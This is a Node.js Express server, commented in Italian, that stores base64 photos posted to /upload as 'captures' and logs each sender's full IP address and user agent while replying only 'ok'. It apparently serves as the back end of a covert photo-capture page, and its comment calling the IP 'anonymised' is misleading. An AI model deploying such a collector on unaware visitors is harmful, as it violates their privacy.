const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');
const app = express();

// Configurazione middleware
app.use(cors()); // Abilita CORS per permettere richieste da qualsiasi origine
app.use(bodyParser.json({ limit: '10mb' })); // Aumenta il limite per gestire immagini base64
app.use(express.static(path.join(__dirname, 'public'))); // Serve file statici dalla cartella public

// Crea la cartella "captures" se non esiste
const capturesDir = path.join(__dirname, 'captures');

// Inizializzazione asincrona
(async () => {
    try {
        await fs.mkdir(capturesDir, { recursive: true });
        console.log('Directory captures pronta');
    } catch (err) {
        console.error('Errore nella creazione della directory captures:', err);
    }
})();

// Endpoint per ricevere la foto
app.post('/upload', async (req, res) => {
    try {
        const fotoData = req.body.foto;
        
        // Verifica se la foto è presente
        if (!fotoData) {
            return res.status(400).json({ error: 'Dati non ricevuti' });
        }
        
        // Estrai i dati base64
        const matches = fotoData.match(/^data:image\/([a-zA-Z]+);base64,(.+)$/);
        
        if (!matches || matches.length !== 3) {
            return res.status(400).json({ error: 'Formato non valido' });
        }
        
        const imageType = matches[1];
        const base64Data = matches[2];
        
        // Genera un timestamp e info aggiuntive
        const timestamp = new Date();
        const ipAddress = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        // Crea un nome file con timestamp e IP anonimizzato
        const lastOctet = ipAddress.split('.').pop().replace(/[^0-9]/g, '');
        const fileName = `capture_${timestamp.toISOString().replace(/[:.]/g, '-')}_${lastOctet}.${imageType}`;
        const filePath = path.join(capturesDir, fileName);
        
        // Scrivi l'immagine
        await fs.writeFile(filePath, base64Data, 'base64');
        
        // Salva info aggiuntive in un file di log
        const logFile = path.join(capturesDir, 'access_log.txt');
        const logEntry = `
Timestamp: ${timestamp.toISOString()}
IP: ${ipAddress}
User-Agent: ${userAgent}
File: ${fileName}
------------------------
`;
        await fs.appendFile(logFile, logEntry);
        
        // Invia risposta di successo senza dettagli
        res.status(200).json({ status: 'ok' });
        
        console.log(`Nuova cattura salvata: ${fileName}`);
        
    } catch (err) {
        console.error('Errore durante il salvataggio:', err);
        res.status(500).json({ status: 'error' });
    }
});

// Pagina HTML principale
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Avvia il server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server attivo sulla porta ${PORT}`);
});